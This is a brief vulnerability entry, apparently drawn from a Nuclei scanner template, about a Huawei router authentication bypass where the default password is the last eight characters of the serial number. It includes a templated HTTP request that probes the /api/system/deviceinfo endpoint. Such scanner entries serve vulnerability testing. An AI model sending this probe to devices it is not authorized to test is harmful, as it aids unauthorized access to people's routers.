# Vulnerability: Huawei Router - Authentication Bypass
**Classification:** CWE-288
**Source:** Nuclei Template (`huawei-router-auth-bypass.yaml`)

## Description
Huawei Routers are vulnerable to authentication bypass because the default password of this router is the last 8 characters of the device's serial number which exist on the back of the device.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /api/system/deviceinfo HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/javascript, */*; q=0.01
Referer: {{BaseURL}}
```

